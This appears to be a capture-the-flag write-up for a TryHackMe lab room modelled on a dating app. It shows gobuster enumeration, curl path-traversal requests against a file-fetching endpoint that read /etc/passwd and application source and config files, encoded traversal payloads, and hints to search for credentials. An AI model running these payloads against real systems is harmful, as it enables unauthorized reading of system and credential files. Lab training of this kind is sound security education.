# TryHackMe - Love at First Breach 2026: Valentine (Valenfind)

## Event Overview
**Event:** Love at First Breach 2026  
**Room:** Valentine (Valenfind)  
**Difficulty:** Medium  
**Category:** Web Application Security  
**Focus:** LFI (Local File Inclusion), Dating App Vulnerabilities

---

## Room Description
Valentine is the entry-level web challenge for the Love at First Breach 2026 CTF event. This room simulates a dating application called "Valenfind" with vulnerabilities that allow attackers to find and exploit security flaws in the web application.

---

## Objectives
- Enumerate the dating web application
- Identify vulnerabilities in the app's endpoints
- Exploit Local File Inclusion (LFI) vulnerability
- Extract sensitive information from the server
- Capture the flag

---

## Reconnaissance

### Initial Exploration
1. Access the web application at `http://<target-ip>`
2. Create a user account on the dating platform
3. Explore available features:
   - User profiles
   - Messaging system
   - Photo uploads
   - Layout/theme selection

### Directory Enumeration
Use GoBuster or similar tools to discover hidden endpoints:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

---

## Exploitation

### Local File Inclusion (LFI) Vulnerability

The key vulnerability exists in the layout/theme fetching endpoint.

#### Step 1: Identify the Vulnerable Endpoint

While using the application, intercept requests with BurpSuite or inspect network traffic:
- Look for endpoints that accept file paths or layout parameters
- Common endpoint: `/fetch-layout` or similar

#### Step 2: Test for LFI

Attempt to read system files:

```bash
curl "http://<target-ip>/fetch-layout?file=../../../../etc/passwd"
```

**Alternative payloads:**
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

#### Step 3: Extract Application Source Code

Once LFI is confirmed, retrieve application files:

```bash
# Read application source
curl "http://<target-ip>/fetch-layout?file=../../../../var/www/html/app.py"

# Read configuration files
curl "http://<target-ip>/fetch-layout?file=../../../../var/www/html/config.php"
```

#### Step 4: Find Credentials or Flags

Common locations to check:
- `/var/www/html/`
- `/home/<user>/`
- `/root/`
- Configuration files
- Database connection strings

---

## Tools Used

| Tool | Purpose |
|------|----------|
| BurpSuite | Traffic interception and analysis |
| cURL | Testing LFI payloads |
| GoBuster | Directory enumeration |
| Browser DevTools | Analyzing client-side code |

---

## Mitigation Recommendations

1. **Input Validation:** Sanitize and validate all user inputs
2. **Path Traversal Prevention:** Use allowlists for file access
3. **Least Privilege:** Run web applications with minimal file system access
4. **Error Handling:** Don't expose system paths in error messages
5. **Security Headers:** Implement proper Content-Security-Policy

---

## Learning Outcomes

- Understanding Local File Inclusion (LFI) vulnerabilities
- Identifying vulnerable endpoints in web applications
- Path traversal attack techniques
- Exploiting file access controls
- Reconnaissance and enumeration skills

---

## Related Vulnerabilities
- LFI (Local File Inclusion)
- Path Traversal
- Information Disclosure
- Insecure File Handling

---

**Event:** Love at First Breach 2026  
**Status:** Completed ✓
